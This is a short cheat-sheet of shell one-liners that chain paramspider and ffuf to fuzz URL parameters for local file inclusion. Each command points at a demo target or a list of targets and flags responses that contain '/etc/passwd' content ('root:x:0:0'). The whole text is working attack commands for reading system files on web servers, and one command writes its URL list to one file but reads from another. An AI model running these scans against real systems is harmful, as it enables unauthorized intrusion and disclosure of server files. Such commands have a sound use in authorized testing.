Single target:
```
paramspider -d <http://testphp.vulnweb.com/> -o ./urls.txt && for URL in $(cat $PWD/params.tmp); do (ffuf -u "$URL" -fc 404 -c -t 15 -mr 'root:x:0:0' -w /opt/tools/fuzzing/LFI.txt); done | tee LFI_results.txt
```

Several targets:
```
cat URLS.txt | xargs -I {} paramspider -d {} | grep -oE 'https?://[^[:space:]]+' | tee -a params.tmp && for URL in $(cat $PWD/params.tmp); do (ffuf -u "$URL" -fc 404 -c -t 15 -mr 'root:x:0:0' -w /opt/tools/fuzzing/LFI.txt); done | tee LFI_results.txt
```
```
paramspider -d testphp.vulnweb.com && for URL in $(cat results/*.txt); do (ffuf -u "$URL" -fc 404 -c -t 15 -mr 'root:x:0:0' -w /opt/payloads/lfi.txt); done | tee LFI_results.txt
```

